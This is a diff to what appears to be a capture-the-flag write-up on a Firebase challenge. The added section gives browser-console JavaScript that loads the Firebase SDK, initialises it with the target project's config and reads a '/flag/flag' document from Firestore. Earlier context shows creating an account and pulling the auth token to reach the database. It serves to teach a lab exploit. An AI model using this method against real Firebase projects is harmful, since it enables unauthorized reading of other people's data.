@@ -47,3 +47,18 @@ app.auth().createUserWithEmailAndPassword('email@example.com','Abc123!')
 ```
 
 Then, run `app.auth()` and `ctrl+f` the UID, access token etc. Use the API either `/oracle` or check the [documentation](https://firebase.google.com/docs/reference/rest/database). Honestly idk what is going on Firebase is weird.
+
+## Solving within Console
+
+If you're too lazy to host or run yourself, then
+
+```javascript
+import("https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js").then((firebase) => {
+    const app = firebase.initializeApp(firebaseConfig);
+    import("https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js").then((firestore) => {
+    const db = firestore.getFirestore(app);
+    firestore.getDoc(firestore.doc(db, `/flag/flag`)).then((a) => {console.log(a.data())})
+    
+    })
+})
+```
